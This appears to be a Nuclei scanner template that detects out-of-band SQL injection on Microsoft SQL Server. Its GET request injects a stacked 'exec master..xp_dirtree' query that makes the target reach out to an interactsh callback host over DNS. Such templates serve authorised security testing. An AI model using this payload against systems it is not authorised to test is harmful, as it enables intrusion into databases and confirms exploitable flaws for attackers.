id: sqli-oob-xp_dirtree

info:
  name: MSSQL SQLi OOB via xp_dirtree
  severity: critical
  author: reewardius
  tags: sqli,oob,mssql,dns

http:
  - method: GET
    path:
      - "{{BaseURL}}/?id=1; exec master..xp_dirtree '\\\\{{interactsh-url}}\\\\abc'--"

    stop-at-first-match: true
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
